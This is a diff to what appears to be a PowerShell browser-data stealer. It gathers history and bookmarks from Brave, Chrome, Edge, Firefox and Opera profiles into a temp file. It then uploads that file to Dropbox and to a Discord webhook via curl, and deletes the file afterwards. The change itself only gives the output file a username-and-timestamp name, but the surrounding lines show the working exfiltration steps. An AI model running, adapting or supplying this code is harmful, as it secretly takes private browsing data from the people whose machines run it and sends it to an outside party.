@@ -38,29 +38,31 @@ function Get-BrowserData {
     } 
 }
 
+$FileName = "$env:USERNAME-BrowserData-$(get-date -f yyyy-MM-dd_hh-mm).txt"
+
 $Brave_Profiles = Get-ChildItem -Path "$Env:USERPROFILE\AppData\Local\BraveSoftware\Brave-Browser\User Data\" -Directory | Where-Object { $_.Name -like "Profile*" } | Select-Object -ExpandProperty Name
 
 if ($Brave_Profiles) {
     $Brave_Profiles | ForEach-Object {
         $profile = $_
-        Get-BrowserData -Browser "brave" -DataType "history" -Profile $profile >> $env:TMP\--BrowserData.txt
-        Get-BrowserData -Browser "brave" -DataType "bookmarks" -Profile $profile >> $env:TMP\--BrowserData.txt
+        Get-BrowserData -Browser "brave" -DataType "history" -Profile $profile >> $env:TMP\$FileName
+        Get-BrowserData -Browser "brave" -DataType "bookmarks" -Profile $profile >> $env:TMP\$FileName
     }
 } else {
-    Get-BrowserData -Browser "brave" -DataType "history" >> $env:TMP\--BrowserData.txt
-    Get-BrowserData -Browser "brave" -DataType "bookmarks" >> $env:TMP\--BrowserData.txt
+    Get-BrowserData -Browser "brave" -DataType "history" >> $env:TMP\$FileName
+    Get-BrowserData -Browser "brave" -DataType "bookmarks" >> $env:TMP\$FileName
 }
 
-Get-BrowserData -Browser "chrome" -DataType "history" >> $env:TMP\--BrowserData.txt
-Get-BrowserData -Browser "chrome" -DataType "bookmarks" >> $env:TMP--BrowserData.txt
+Get-BrowserData -Browser "chrome" -DataType "history" >> $env:TMP\$FileName
+Get-BrowserData -Browser "chrome" -DataType "bookmarks" >> $env:TMP\$FileName
 
-Get-BrowserData -Browser "edge" -DataType "history" >> $env:TMP\--BrowserData.txt
-Get-BrowserData -Browser "edge" -DataType "bookmarks" >> $env:TMP\--BrowserData.txt
+Get-BrowserData -Browser "edge" -DataType "history" >> $env:TMP\$FileName
+Get-BrowserData -Browser "edge" -DataType "bookmarks" >> $env:TMP\$FileName
 
-Get-BrowserData -Browser "firefox" -DataType "history" >> $env:TMP\--BrowserData.txt
+Get-BrowserData -Browser "firefox" -DataType "history" >> $env:TMP\$FileName
 
-Get-BrowserData -Browser "opera" -DataType "history" >> $env:TMP\--BrowserData.txt
-Get-BrowserData -Browser "opera" -DataType "bookmarks" >> $env:TMP\--BrowserData.txt
+Get-BrowserData -Browser "opera" -DataType "history" >> $env:TMP\$FileName
+Get-BrowserData -Browser "opera" -DataType "bookmarks" >> $env:TMP\$FileName
 
 # Get DropBox access_token
 
@@ -97,7 +99,7 @@ $headers.Add("Content-Type", 'application/octet-stream')
 Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
 }
 
-if (-not ([string]::IsNullOrEmpty($db))){DropBox-Upload -f $env:TMP\--BrowserData.txt}
+if (-not ([string]::IsNullOrEmpty($db))){DropBox-Upload -f $env:TMP\$FileName}
 
 #------------------------------------------------------------------------------------------------------------------------------------
 
@@ -124,8 +126,8 @@ Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -B
 if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
 }
 
-if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file $env:TMP\--BrowserData.txt}
+if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file $env:TMP\$FileName}
 
 
 ############################################################################################################################################################
-RI $env:TEMP/--BrowserData.txt
+RI $env:TEMP\$FileName
